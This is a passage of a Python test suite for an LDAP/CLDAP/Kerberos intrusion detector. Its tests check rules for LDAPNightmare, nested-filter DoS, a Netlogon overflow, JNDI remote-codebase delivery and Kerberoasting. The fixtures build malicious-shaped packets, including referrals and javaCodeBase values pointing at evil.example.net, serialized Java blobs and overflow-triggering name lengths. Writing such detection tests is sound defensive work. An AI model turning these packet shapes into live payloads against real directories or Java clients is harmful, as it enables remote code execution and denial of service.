    h.check("T21: both messages parsed", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes and "LDAP-ROOTDSE-PROBE" in codes)

    # ---- T22: TCP reassembly — one message split across two segments ----- #
    whole = ldap_message(1, bind_request(3, "cn=a,dc=corp", simple="pw"))
    cut = len(whole) // 2
    recs, codes = h.run([("c2s", whole[:cut]), ("c2s", whole[cut:])])
    h.check("T22: fragmented message reassembled", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes)

    # ---- T23: framed-but-invalid message is skipped, stream stays aligned  #
    # A well-formed BER SEQUENCE that is NOT a valid LDAPMessage (only one child,
    # so no protocolOp). Its length is self-consistent, so framing consumes it
    # whole; dissect fails; the following real message must still parse.
    framed_junk = seq(octet("garbage"))
    good = ldap_message(1, bind_request(3, "cn=a,dc=corp", simple="pw"))
    recs, codes = h.run([("c2s", framed_junk + good)])
    h.check("T23: framed junk skipped, next msg parses", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes)

    # ---- T23b: corrupt-length segment is dropped; a later segment parses -- #
    # Length byte 0x88 => long form with 8 length octets (> _MAX_LEN_BYTES) ->
    # ber_peek raises -> _drain drops the half-stream backlog. Next segment is clean.
    corrupt = b"\x30\x88" + b"\x00" * 8
    recs, codes = h.run([("c2s", corrupt), ("c2s", good)])
    h.check("T23b: corrupt length dropped, recovery parses", "LDAP-CLEARTEXT-SIMPLE-BIND" in codes)

    # ---- T24: LDAPS port (636) is never dissected ------------------------ #
    recs, codes = h.run([("c2s", ldap_message(1, bind_request(3, "cn=a,dc=corp", simple="pw")))],
                        cleartext=False)
    h.check("T24: LDAPS bytes not dissected", codes == [])

    # ---- T25: CLDAP query + amplification -------------------------------- #
    query = ldap_message(1, search_request("", L.SCOPE_BASE, f_present("objectClass")))
    small_req = (CLIENT[0], CLIENT[1], SERVER[0], 389, query)
    big_resp = (SERVER[0], 389, CLIENT[0], CLIENT[1], b"\x30" + b"\x00" * 3000)
    recs, codes = h.run_udp([small_req, big_resp])
    h.check("T25: CLDAP query fires", "LDAP-CLDAP-QUERY" in codes)
    h.check("T25: CLDAP amplification fires", "LDAP-CLDAP-AMPLIFICATION" in codes)
    h.check("T25: amp marked udp",
            any(r["finding"] == "LDAP-CLDAP-AMPLIFICATION" and r["proto"] == "udp" for r in recs))

    # ---- T25b: small symmetric CLDAP must NOT trip amplification --------- #
    resp_small = (SERVER[0], 389, CLIENT[0], CLIENT[1], b"\x30" + b"\x00" * 40)
    recs, codes = h.run_udp([small_req, resp_small])
    h.check("T25b: no amp on symmetric CLDAP", "LDAP-CLDAP-AMPLIFICATION" not in codes)

    # ---- Emitter: dedup within window ------------------------------------ #
    em = L.JSONLEmitter(path=None, also_stdout=False, min_severity="info", dedup_window=60.0)
    buf = io.StringIO()
    _old = sys.stdout
    rec = {"ts": L.iso(1.0), "module": "ldapwatch", "finding": "LDAP-ROOTDSE-PROBE",
           "severity": "low", "category": "recon", "title": "x", "proto": "tcp",
           "src": "a", "sport": 1, "dst": "b", "dport": 389, "message_id": 1}
    em.emit(dict(rec))
    em.emit(dict(rec))
    h.check("emitter: dedup suppresses duplicate", em.count == 1)

    # ---- Emitter: min-severity filter ------------------------------------ #
    em2 = L.JSONLEmitter(path=None, also_stdout=False, min_severity="high")
    em2.emit({"ts": L.iso(1.0), "module": "ldapwatch", "finding": "LDAP-ROOTDSE-PROBE",
              "severity": "low", "category": "recon", "title": "x", "proto": "tcp",
              "src": "a", "sport": 1, "dst": "b", "dport": 389})
    h.check("emitter: below-threshold dropped", em2.count == 0)

    # ---- Bind security posture: signing / channel binding ---------------- #
    # LDAP-SASL-NO-SIGNING: SASL bind completes on cleartext and a real op is
    # still readable afterwards -> the SASL layer negotiated no integrity.
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSSAPI"))),
        ("s2c", ldap_message(1, bind_response(0))),
        ("c2s", ldap_message(2, search_request("dc=x", L.SCOPE_ONELEVEL, f_equality("uid", "bob")))),
    ])
    h.check("posture: unsigned SASL session flagged", "LDAP-SASL-NO-SIGNING" in codes)

    # multi-step SASL (saslBindInProgress then success) is handled too
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSS-SPNEGO"))),
        ("s2c", ldap_message(1, bind_response(14))),
        ("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSS-SPNEGO"))),
        ("s2c", ldap_message(1, bind_response(0))),
        ("c2s", ldap_message(2, search_request("dc=x", L.SCOPE_SUBTREE, f_present("objectClass")))),
    ])
    h.check("posture: unsigned multi-step SASL flagged", "LDAP-SASL-NO-SIGNING" in codes)

    # gate: a simple (non-SASL) bind is a different, already-flagged issue
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "cn=a,dc=x", simple="pw"))),
        ("s2c", ldap_message(1, bind_response(0))),
        ("c2s", ldap_message(2, search_request("dc=x", L.SCOPE_ONELEVEL, f_equality("uid", "bob")))),
    ])
    h.check("posture gate: simple bind not unsigned-SASL", "LDAP-SASL-NO-SIGNING" not in codes)

    # gate: a SASL bind that never succeeds is never 'bound'
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSSAPI"))),
        ("s2c", ldap_message(1, bind_response(49))),
        ("c2s", ldap_message(2, search_request("dc=x", L.SCOPE_ONELEVEL, f_equality("uid", "bob")))),
    ])
    h.check("posture gate: failed SASL not unsigned", "LDAP-SASL-NO-SIGNING" not in codes)

    # gate: bound but no following op -> no evidence -> silent
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSSAPI"))),
        ("s2c", ldap_message(1, bind_response(0))),
    ])
    h.check("posture gate: bound-but-no-op silent", "LDAP-SASL-NO-SIGNING" not in codes)

    # fires once per session
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "", sasl_mech="GSSAPI"))),
        ("s2c", ldap_message(1, bind_response(0))),
        ("c2s", ldap_message(2, search_request("dc=x", L.SCOPE_ONELEVEL, f_equality("uid", "a")))),
        ("c2s", ldap_message(3, search_request("dc=x", L.SCOPE_ONELEVEL, f_equality("uid", "b")))),
    ])
    h.check("posture: unsigned SASL fires once", codes.count("LDAP-SASL-NO-SIGNING") == 1)

    # LDAP-STRONGER-AUTH-REQUIRED: server refuses a cleartext bind (good posture)
    for rc in (8, 13):
        _, codes = h.run([("s2c", ldap_message(1, bind_response(rc)))])
        h.check(f"posture: stronger-auth-required rc={rc}", "LDAP-STRONGER-AUTH-REQUIRED" in codes)
    _, codes = h.run([("s2c", ldap_message(1, bind_response(0)))])
    h.check("posture gate: success not stronger-auth", "LDAP-STRONGER-AUTH-REQUIRED" not in codes)

    # LDAP-BIND-BEFORE-STARTTLS: credentialed bind, then STARTTLS on same conn
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "cn=a,dc=x", simple="pw"))),
        ("c2s", ldap_message(2, extended_request(L.OID_STARTTLS))),
    ])
    h.check("posture: bind-before-STARTTLS flagged", "LDAP-BIND-BEFORE-STARTTLS" in codes)
    _, codes = h.run([("c2s", ldap_message(1, extended_request(L.OID_STARTTLS)))])
    h.check("posture gate: STARTTLS-first silent", "LDAP-BIND-BEFORE-STARTTLS" not in codes)
    _, codes = h.run([
        ("c2s", ldap_message(1, bind_request(3, "", simple=""))),
        ("c2s", ldap_message(2, extended_request(L.OID_STARTTLS))),
    ])
    h.check("posture gate: anon-before-STARTTLS silent", "LDAP-BIND-BEFORE-STARTTLS" not in codes)

    # ---- CVE-2024-49112/49113 LDAPNightmare ------------------------------ #
    # Malicious: 4-byte messageID whose bits >= 25 are set, on a referral response.
    MAL_MID = b"\x02\x00\x00\x02"          # >>25 == 1
    mal = ldap_message_wide_mid(MAL_MID, result_referral("ldap://evil.example.net/dc=x"))
    m = L.dissect_message(mal)
    h.check("nightmare: wide messageID width parsed", m.message_id_len == 4)
    h.check("nightmare: lm_referral non-zero", (m.message_id >> 25) != 0)
    h.check("nightmare: referral result code", m.op.get("result_code") == L.RESULT_REFERRAL)

    eng = L.LDAPEngine(L.Config())
    h.check("nightmare: detector fires", eng._is_referral_msgid_overflow(m))

    # over TCP (malicious LDAP server reaching the same wldap32 path)
    _, codes = h.run([("s2c", mal)])
    h.check("nightmare: flagged over TCP", "LDAP-REFERRAL-MSGID-OVERFLOW" in codes)

    # over CLDAP, IPv4 and IPv6 — detection is address-family agnostic
    for label, s, d in (("v4", "10.10.0.10", "10.10.0.5"),
                        ("v6", "2001:db8::10", "2001:db8::5")):
        recs = eng.process_cldap_response(1.0, s, 389, d, 50000, mal, req_len=60)
        got = [r["finding"] for r in recs]
        h.check(f"nightmare: flagged over CLDAP {label}",
                "LDAP-REFERRAL-MSGID-OVERFLOW" in got)

    # unsolicited (no matching request seen) still fires — amplification needs a
    # request length, this must not
    recs = eng.process_cldap_response(1.0, "10.10.0.10", 389, "10.10.0.5", 50000, mal, req_len=None)
    h.check("nightmare: unsolicited response still flagged",
            "LDAP-REFERRAL-MSGID-OVERFLOW" in [r["finding"] for r in recs])

    # FP gates
    h.check("nightmare gate: narrow messageID quiet",
            not eng._is_referral_msgid_overflow(L.dissect_message(
                ldap_message(1, result_referral("ldap://dc1.corp.local/dc=x")))))
    h.check("nightmare gate: wide but low bits quiet",
            not eng._is_referral_msgid_overflow(L.dissect_message(
                ldap_message_wide_mid(b"\x00\x00\x00\x7f",
                                      result_referral("ldap://dc1.corp.local/dc=x")))))
    h.check("nightmare gate: no referral URLs quiet",
            not eng._is_referral_msgid_overflow(L.dissect_message(
                ldap_message_wide_mid(MAL_MID, result_referral()))))
    h.check("nightmare gate: success result quiet",
            not eng._is_referral_msgid_overflow(L.dissect_message(
                ldap_message_wide_mid(MAL_MID, result_referral(
                    "ldap://dc1.corp.local/dc=x", result_code=0)))))
    _, codes = h.run([("s2c", mal), ("s2c", mal)])
    h.check("nightmare: fires once per session",
            codes.count("LDAP-REFERRAL-MSGID-OVERFLOW") == 1)

    # ---- CVE-2020-12243 nested-filter slapd DoS -------------------------- #
    _, codes = h.run([("c2s", ldap_message(1, search_request(
        "dc=x", L.SCOPE_ONELEVEL, nested_filter(20))))])
    h.check("nestdos: deep filter flagged", "LDAP-FILTER-NEST-DOS" in codes)

    # deeper than the parser's own walk limit: must still fire, not vanish into
    # the BERError/truncation path
    _, codes = h.run([("c2s", ldap_message(1, search_request(
        "dc=x", L.SCOPE_ONELEVEL, nested_filter(L._MAX_DEPTH + 25))))])
    h.check("nestdos: beyond parser depth cap still flagged",
            "LDAP-FILTER-NEST-DOS" in codes)

    # over CLDAP too
    recs, codes = h.run_udp([("10.10.0.5", 40000, "10.10.0.10", 389,
                              ldap_message(2, search_request(
                                  "dc=x", L.SCOPE_ONELEVEL, nested_filter(20))))])
    h.check("nestdos: flagged over CLDAP", "LDAP-FILTER-NEST-DOS" in codes)

    # FP gate: ordinary filters are nowhere near the threshold
    _, codes = h.run([("c2s", ldap_message(1, search_request(
        "dc=x", L.SCOPE_ONELEVEL, nested_filter(3))))])
    h.check("nestdos gate: ordinary nesting quiet", "LDAP-FILTER-NEST-DOS" not in codes)
    _, codes = h.run([("c2s", ldap_message(1, search_request(
        "dc=corp", L.SCOPE_SUBTREE, f_present("objectClass"))))])
    h.check("nestdos gate: flat filter quiet", "LDAP-FILTER-NEST-DOS" not in codes)

    # threshold is configurable and actually consulted
    cfg_depth = L.Config()
    h.check("nestdos: default threshold is 12", cfg_depth.filter_depth_threshold == 12)

    # ---- CVE-2026-41089 LongLogon (Netlogon CLDAP stack overflow) -------- #
    # Routing predicate, pinned to the binary-verified rule:
    # legacy builder iff (NtVer & 0x0C) == 0 and (NtVer & 0x02) != 0.
    for ntver, expect in ((0x02, True), (0x03, True), (0x12, True),
                          (0x16, False), (0x06, False), (0x0a, False),
                          (0x01, False), (0x00, False)):
        h.check(f"longlogon: NtVer 0x{ntver:02x} routes_legacy={expect}",
                L.ntver_routes_legacy(ntver) is expect)

    # Request leg, CLDAP, IPv4 and IPv6 (detection reads payload only).
    atk = ldap_message(1, search_request("", L.SCOPE_BASE, ntver_filter(0x02)))
    for lbl, c, srv in (("v4", "10.0.0.7", "10.0.0.10"),
                        ("v6", "2001:db8::7", "2001:db8::10")):
        eng = L.LDAPEngine(L.Config())
        got = [f["finding"] for f in eng.process_cldap_query(1.0, c, 50000, srv, 389, atk)]
        h.check(f"longlogon: legacy ping flagged over CLDAP {lbl}",
                "LDAP-NETLOGON-NTVER-ANOMALY" in got)

    # THE BLIND SPOT this detector exists to close: the attack ping is tiny, so
    # a rule keying on BER lengths over 256 bytes cannot see it at all.
    h.check("longlogon: attack ping is under the 256-byte BER-rule floor", len(atk) < 256)

    # COUNTERFACTUAL: score the published BER-length rule against the same
    # traffic. This is the mutation that proves the blind spot is real rather
    # than asserted -- the existing rule must MISS what ldapwatch catches.
    def ber_length_rule(pkt, floor=256):
        """Stand-in for the public rule: fire on a BER element longer than floor."""
        try:
            el = L.ber_read(pkt, 0)[0] if isinstance(L.ber_read(pkt, 0), tuple) else None
        except Exception:
            el = None
        return len(pkt) > floor

    legacy_pings = [ldap_message(i, search_request("", L.SCOPE_BASE, ntver_filter(0x02)))
                    for i in range(1, 4)]
    rule_hits = sum(1 for pk in legacy_pings if ber_length_rule(pk))
    ours = 0
    for pk in legacy_pings:
        e = L.LDAPEngine(L.Config())
        if "LDAP-NETLOGON-NTVER-ANOMALY" in [f["finding"] for f in
                e.process_cldap_query(1.0, "10.0.0.7", 50000, "10.0.0.10", 389, pk)]:
            ours += 1
    h.check(f"longlogon: BER-length>256 rule catches 0/{len(legacy_pings)} legacy pings",
            rule_hits == 0)
    h.check(f"longlogon: ldapwatch catches {len(legacy_pings)}/{len(legacy_pings)}",
            ours == len(legacy_pings))

    for ntver in (0x16, 0x06, 0x01):
        eng = L.LDAPEngine(L.Config())
        got = [f["finding"] for f in eng.process_cldap_query(
            1.0, "10.0.0.7", 50000, "10.0.0.10", 389,
            ldap_message(1, search_request("", L.SCOPE_BASE, ntver_filter(ntver))))]
        h.check(f"longlogon gate: NtVer 0x{ntver:02x} (V5EX set) quiet",
                "LDAP-NETLOGON-NTVER-ANOMALY" not in got)

    # Response leg: the overflow precondition is the DC's OWN DNS names.
    LAB_D = "a" * 93 + ".corp"                     # 98 chars, the lab crash point
    LAB_H = "dc12345." + LAB_D                     # 7-char host label
    h.check("longlogon: lab fixture is the published geometry",
            len(LAB_D) == 98 and LAB_H.split(".")[0] == "dc12345")
    long_entry = ldap_message(2, search_result_entry_attrs(
        "", {"Netlogon": [netlogon_response(LAB_D, LAB_D, LAB_H)]}))

    for lbl, srv, cli in (("v4", "10.0.0.10", "10.0.0.7"),
                          ("v6", "2001:db8::10", "2001:db8::7")):
        eng = L.LDAPEngine(L.Config())
        got = [f["finding"] for f in eng.process_cldap_response(
            1.0, srv, 389, cli, 50000, long_entry, req_len=None)]
        h.check(f"longlogon: overflow precondition flagged {lbl}",
                "LDAP-NETLOGON-OVERFLOW-PRECOND" in got)

    # both response shapes decode (legacy and _EX carry the names at different offsets)
    for legacy in (False, True):
        info = L.parse_netlogon_response(
            netlogon_response("corp.local", "corp.local", "dc1.corp.local", legacy=legacy))
        h.check(f"longlogon: netlogon decode (legacy={legacy})",
                info is not None and info["dns_domain"] == "corp.local"
                and info["dns_host"] == "dc1.corp.local" and info["legacy"] is legacy)

    # gate: an ordinary DC name cannot overflow and must stay silent
    eng = L.LDAPEngine(L.Config())
    got = [f["finding"] for f in eng.process_cldap_response(
        1.0, "10.0.0.10", 389, "10.0.0.7", 50000,
        ldap_message(2, search_result_entry_attrs("", {"Netlogon": [
            netlogon_response("corp.local", "corp.local", "dc1.corp.local")]})), req_len=None)]
    h.check("longlogon gate: default-named DC silent",
            "LDAP-NETLOGON-OVERFLOW-PRECOND" not in got)

    # gate: a long attacker User field is NOT the overflow and must not fire
    eng = L.LDAPEngine(L.Config())
    got = [f["finding"] for f in eng.process_cldap_query(
        1.0, "10.0.0.7", 50000, "10.0.0.10", 389,
        ldap_message(1, search_request("", L.SCOPE_BASE,
                                       f_equality("User", "A" * 200))))]
    h.check("longlogon gate: long User field alone is not an overflow",
            "LDAP-NETLOGON-OVERFLOW-PRECOND" not in got
            and "LDAP-NETLOGON-NTVER-ANOMALY" not in got)

    # once per DC, and the correlation flag records the earlier legacy ping
    eng = L.LDAPEngine(L.Config())
    eng.process_cldap_query(1.0, "10.0.0.7", 50000, "10.0.0.10", 389, atk)
    first = eng.process_cldap_response(1.0, "10.0.0.10", 389, "10.0.0.7", 50000,
                                       long_entry, req_len=None)
    again = eng.process_cldap_response(1.0, "10.0.0.10", 389, "10.0.0.7", 50000,
                                       long_entry, req_len=None)
    rec = [f for f in first if f["finding"] == "LDAP-NETLOGON-OVERFLOW-PRECOND"][0]
    h.check("longlogon: precondition fires once per DC",
            "LDAP-NETLOGON-OVERFLOW-PRECOND" not in [f["finding"] for f in again])
    h.check("longlogon: correlates the earlier legacy ping",
            rec["detail"]["legacy_ntver_seen"] is True)

    # ---- CVE-2021-44228/45046 JNDI remote-object delivery ---------------- #
    # R1: remote codebase delivered (the marshalsec / JNDIExploit shape)
    _, codes = h.run([("s2c", ldap_message(1, jndi_reference_entry()))])
    h.check("jndi R1: remote codebase delivered", "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    # attribute descriptions are case-insensitive (RFC 4512 s2.5)
    for variant in (b"JAVACODEBASE", b"JavaCodeBase"):
        _, codes = h.run([("s2c", ldap_message(1, jndi_reference_entry(
            codebase_attr=variant)))])
        h.check(f"jndi R1: case variant {variant.decode()} still matches",
                "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    for scheme in ("http://evil.example.net/a", "https://evil.example.net/a",
                   "ftp://evil.example.net/a", "file:///tmp/a"):
        _, codes = h.run([("s2c", ldap_message(1, jndi_reference_entry(codebase=scheme)))])
        h.check(f"jndi R1: {scheme.split(':')[0]} codebase fires",
                "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    # R2: serialized Java object, gated on the stream magic
    _, codes = h.run([("s2c", ldap_message(2, jndi_serialized_entry()))])
    h.check("jndi R2: serialized object delivered", "LDAP-JNDI-SERIALIZED-OBJECT" in codes)
    h.check("jndi: serialization magic is AC ED 00 05",
            L.JAVA_SERIAL_MAGIC == b"\xac\xed\x00\x05")

    # A ~64 KB value must survive the parser's defensive caps. A depth/length cap
    # that swallowed the payload would blind the detector to its own target
    # class, so this is asserted, not assumed.
    big = L.JAVA_SERIAL_MAGIC + b"\x73\x72\x00" + b"\xde\xad\xbe\xef" * 16000
    big_pdu = ldap_message(3, jndi_serialized_entry(blob=big))
    parsed = L.dissect_message(big_pdu)
    h.check("jndi: 64 KB serialized value survives the BER caps intact",
            bytes(parsed.op["attributes"]["javaserializeddata"][0]) == big)
    _, codes = h.run([("s2c", big_pdu)])
    h.check("jndi R2: 64 KB payload still fires", "LDAP-JNDI-SERIALIZED-OBJECT" in codes)

    # evidence discipline: length and digest, never the blob
    recs, _ = h.run([("s2c", ldap_message(4, jndi_serialized_entry(blob=big)))])
    ser = [r for r in recs if r["finding"] == "LDAP-JNDI-SERIALIZED-OBJECT"]
    if ser:
        blob_json = json.dumps(ser[0])
        h.check("jndi R2: logs length and sha256",
                ser[0]["detail"]["serialized_len"] == len(big)
                and ser[0]["detail"]["serialized_sha256"] ==
                hashlib.sha256(big).hexdigest())
        h.check("jndi R2: serialized blob is never logged",
                "deadbeef" not in blob_json.lower())
    else:
        h.check("jndi R2: logs length and sha256", False)
        h.check("jndi R2: serialized blob is never logged", False)

    # R3 is corroborating only and must NEVER fire on its own
    _, codes = h.run([("s2c", ldap_message(5, jndi_local_factory_entry()))])
    h.check("jndi R3 gate: local-factory entry alone is silent",
            not any("JNDI" in c for c in codes))

    # ...but it is recorded as an attribute when a delivery DOES fire
    recs, _ = h.run([("s2c", ldap_message(6, jndi_reference_entry(
        factory="org.apache.naming.factory.BeanFactory")))])
    r1 = [r for r in recs if r["finding"] == "LDAP-JNDI-CODEBASE-DELIVERED"][0]
    h.check("jndi R3: naming-reference flag carried on R1",
            r1["detail"]["java_naming_reference"] is True
            and r1["detail"]["java_factory"] == "org.apache.naming.factory.BeanFactory")
    h.check("jndi R1: codebase host logged as an IOC",
            r1["detail"]["codebase_targets"][0]["host"] == "evil.example.net:8080")
    h.check("jndi: finding class is delivery, not execution",
            "execution" in r1["detail"]["note"].lower())

    # Negatives
    _, codes = h.run([("s2c", ldap_message(7, ordinary_entry()))])
    h.check("jndi gate: ordinary user entry silent", not any("JNDI" in c for c in codes))
    _, codes = h.run([("s2c", ldap_message(8, search_result_entry("")))])
    h.check("jndi gate: RootDSE entry silent", not any("JNDI" in c for c in codes))
    _, codes = h.run([("s2c", ldap_message(9, jndi_reference_entry(codebase="Exploit")))])
    h.check("jndi gate: javaCodeBase that is not a URL silent",
            not any("JNDI" in c for c in codes))
    _, codes = h.run([("s2c", ldap_message(10, jndi_serialized_entry(magic=False)))])
    h.check("jndi gate: javaSerializedData without the magic silent",
            not any("JNDI" in c for c in codes))

    # Allowlist suppresses R2 only, and only when configured
    allow = L.Config()
    allow.jndi_allow_nets.append(ipaddress.ip_network("10.9.9.0/24"))
    h.check("jndi: allowlist matches a declared server",
            allow.jndi_allowed("10.9.9.5") is True)
    h.check("jndi: allowlist does not match other servers",
            allow.jndi_allowed("10.1.1.5") is False)
    h.check("jndi: with no allowlist configured nothing is allowed",
            L.Config().jndi_allowed("10.9.9.5") is False)

    # an allowlisted server is suppressed for R2 but NOT for R1
    def _allow_cfg():
        c = L.Config()
        c.jndi_allow_nets.append(ipaddress.ip_network("10.9.9.0/24"))
        return c

    _, codes = h.run([("s2c", ldap_message(11, jndi_serialized_entry()))],
                     config=_allow_cfg(), server_ip="10.9.9.5")
    h.check("jndi R2: allowlisted server suppressed",
            "LDAP-JNDI-SERIALIZED-OBJECT" not in codes)
    _, codes = h.run([("s2c", ldap_message(12, jndi_serialized_entry()))],
                     config=_allow_cfg(), server_ip="10.1.1.5")
    h.check("jndi R2: non-allowlisted server still fires",
            "LDAP-JNDI-SERIALIZED-OBJECT" in codes)
    _, codes = h.run([("s2c", ldap_message(13, jndi_reference_entry()))],
                     config=_allow_cfg(), server_ip="10.9.9.5")
    h.check("jndi R1: allowlist does NOT suppress a remote codebase",
            "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    # --jndi-anyport: a rogue listener on a random high port, roles settled by
    # the SYN-ACK rather than by port number.
    def _anyport_cfg():
        c = L.Config()
        c.jndi_anyport = True
        return c

    _, codes = h.run([("s2c", ldap_message(14, jndi_reference_entry()))],
                     config=_anyport_cfg(), server_port=47001, flags=0x12)
    h.check("jndi anyport: rogue listener on :47001 caught via SYN-ACK role",
            "LDAP-JNDI-CODEBASE-DELIVERED" in codes)
    _, codes = h.run([("s2c", ldap_message(15, jndi_reference_entry()))],
                     server_port=47001, flags=0x12)
    h.check("jndi anyport gate: off by default, :47001 not dissected",
            not any("JNDI" in c for c in codes))
    # mid-flow capture: no handshake seen, roles settled from content
    _, codes = h.run([("s2c", ldap_message(16, jndi_reference_entry()))],
                     config=_anyport_cfg(), server_port=47002, flags=0x18)
    h.check("jndi anyport: mid-flow capture settles roles from content",
            "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    # ROLE CORRECTNESS, with the ports arranged so that guessing by port number
    # gives the WRONG answer: the client here is on a LOWER port than the rogue
    # server, so only the SYN-ACK (or the payload's own operation) identifies
    # which side is the server. Attribution of the victim depends on it.
    recs, codes = h.run([("s2c", ldap_message(17, jndi_reference_entry()))],
                        config=_anyport_cfg(), server_port=47003,
                        client_ip="10.1.1.77", flags=0x12)
    h.check("jndi anyport: fires when the client port is below the server port",
            "LDAP-JNDI-CODEBASE-DELIVERED" in codes)
    jr = [r for r in recs if r["finding"] == "LDAP-JNDI-CODEBASE-DELIVERED"]
    h.check("jndi anyport: victim is attributed to the client, not the server",
            bool(jr) and jr[0]["detail"]["victim_client"] == "10.1.1.77"
            and jr[0]["src"] == "10.1.1.77" and jr[0]["dport"] == 47003)

    # The SYN-ACK path on its OWN. The first payload segment here is only HALF a
    # PDU, so content inference cannot settle the roles -- the handshake is the
    # only signal left, and the client sits on a lower port than the server so
    # port-number guessing gives the wrong answer. This is the only fixture that
    # can tell a correct SYN-ACK rule from a port-ordering guess.
    _split = ldap_message(18, jndi_reference_entry())
    _cut = len(_split) // 2
    _, codes = h.run([("s2c", b"", 0x12),            # SYN-ACK, no payload
                      ("s2c", _split[:_cut], 0x18),  # partial: undissectable
                      ("s2c", _split[_cut:], 0x18)],
                     config=_anyport_cfg(), server_port=47004,
                     client_ip="10.1.1.78")
    h.check("jndi anyport: SYN-ACK alone settles roles for a split first segment",
            "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    # Entry split across TCP segments must still be caught
    pdu = ldap_message(13, jndi_reference_entry())
    cut = len(pdu) // 2
    _, codes = h.run([("s2c", pdu[:cut]), ("s2c", pdu[cut:])])
    h.check("jndi: entry split across TCP segments still fires",
            "LDAP-JNDI-CODEBASE-DELIVERED" in codes)

    # REAL-SERVER NEGATIVE CALIBRATION. These two PDUs were captured off the
    # wire from OpenLDAP slapd with java.schema loaded, serving legitimate
    # legacy JNDI bindings. They are what a genuine directory emits, which is
    # the only honest way to calibrate these rules.
    try:
        import real_rfc2713_fixture as _RF
    except ImportError:
        _RF = None
        print("  [SKIP] real_rfc2713_fixture.py absent -- real-server negative NOT run")
    if _RF is not None:
        _, codes = h.run([("s2c", _RF.REAL_SERIALIZED)])
        h.check("jndi real-server: legitimate javaSerializedObject DOES trip R2",
                "LDAP-JNDI-SERIALIZED-OBJECT" in codes)
        _, codes = h.run([("s2c", _RF.REAL_SERIALIZED)],
                         config=_allow_cfg(), server_ip="10.9.9.5")
        h.check("jndi real-server: allowlist suppresses the legitimate directory",
                "LDAP-JNDI-SERIALIZED-OBJECT" not in codes)
        # The decisive R3 result: a real local-factory naming reference is SILENT.
        _, codes = h.run([("s2c", _RF.REAL_REFERENCE)])
        h.check("jndi real-server: legitimate javaNamingReference stays silent",
                not any("JNDI" in c for c in codes))
        rm = L.dissect_message(_RF.REAL_REFERENCE)
        h.check("jndi real-server: that entry really has factory+address, no codebase",
                "javafactory" in rm.op["attributes"]
                and "javareferenceaddress" in rm.op["attributes"]
                and "javacodebase" not in rm.op["attributes"])

    # 1389 is dissected by default (the common rogue-JNDI listener port)
    h.check("jndi: port 1389 is in the cleartext dissect set",
            L.JNDI_ALT_PORT == 1389 and 1389 in L.CLEARTEXT_LDAP_PORTS)

    # ---- Kerberos TGS plane: Kerberoasting (T1558.003/.004) -------------- #
    def _kcfg(**kw):
        c = L.Config()
        for k, v in kw.items():
            setattr(c, k, v)
        return c

    KDC1 = [ipaddress.ip_network("10.10.0.10/32")]
    SQL = ["MSSQLSvc", "sql.corp.local:1433"]

    # Bit layout, pinned. These two values are VERIFIED against impacket's own
    # encoder in the xcheck tier; here they are asserted as constants so a
    # change to the bit index cannot pass silently.
    h.check("krb: canonicalize is bit 15", L.KDCOPT_CANONICALIZE == 15)
    h.check("krb: canonicalize mask is 0x00010000", L.kdcopt_mask(15) == 0x00010000)
    h.check("krb: windows shape is 0x40810000", KDCOPT_WINDOWS == 0x40810000)
    h.check("krb: roast shape is 0x40800000", KDCOPT_ROAST == 0x40800000)
    h.check("krb: the two shapes differ only in canonicalize",
            KDCOPT_WINDOWS ^ KDCOPT_ROAST == L.kdcopt_mask(L.KDCOPT_CANONICALIZE))

    # R1 honeytoken -- the durable control
    _, codes = h.run_krb([("c2s", tgs_req(["MSSQLSvc", "decoy.corp.local:1433"]))],
                         config=_kcfg(krb_honeypot_spns={"mssqlsvc/decoy.corp.local"}))
    h.check("krb R1: decoy SPN flagged", "LDAP-KRB-ROAST-HONEYTOKEN" in codes)
    _, codes = h.run_krb([("c2s", tgs_req(SQL))],
                         config=_kcfg(krb_honeypot_spns={"mssqlsvc/decoy.corp.local"}))
    h.check("krb R1 gate: a real SPN is not the decoy",
            "LDAP-KRB-ROAST-HONEYTOKEN" not in codes)
    _, codes = h.run_krb([("c2s", tgs_req(["MSSQLSvc", "decoy.corp.local:1433"]))])
    h.check("krb R1 arming: disarmed with no decoy configured",
            "LDAP-KRB-ROAST-HONEYTOKEN" not in codes)

    # R2 LDAP SPN enumeration then roast, correlated inside one module
    spn_search = [("c2s", ldap_message(1, search_request(
        "dc=corp", L.SCOPE_SUBTREE, f_present("servicePrincipalName"))))]
    _, codes = h.run_krb([("c2s", tgs_req(SQL))],
                         config=_kcfg(kdc_nets=list(KDC1)), ldap_steps=spn_search)
    h.check("krb R2: SPN enumeration then TGS-REQ correlated",
            "LDAP-KRB-SPN-ENUM-THEN-ROAST" in codes)
    _, codes = h.run_krb([("c2s", tgs_req(SQL))], config=_kcfg(kdc_nets=list(KDC1)))
    h.check("krb R2 gate: no preceding SPN search, silent",
            "LDAP-KRB-SPN-ENUM-THEN-ROAST" not in codes)
    _, codes = h.run_krb([("c2s", tgs_req(SQL))], ldap_steps=spn_search)
    h.check("krb R2 arming: disarmed with no --kdc",
            "LDAP-KRB-SPN-ENUM-THEN-ROAST" not in codes)
    # the search is recognised from the requested ATTRIBUTE LIST too, not just
    # the filter -- GetUserSPNs asks for the attribute by name
    attr_search = [("c2s", ldap_message(2, search_request(
        "dc=corp", L.SCOPE_SUBTREE, f_present("objectClass"),
        attributes=["sAMAccountName", "servicePrincipalName"])))]
    _, codes = h.run_krb([("c2s", tgs_req(SQL))],
                         config=_kcfg(kdc_nets=list(KDC1)), ldap_steps=attr_search)
    h.check("krb R2: SPN search seen via the requested attribute list",
            "LDAP-KRB-SPN-ENUM-THEN-ROAST" in codes)
    # outside the window
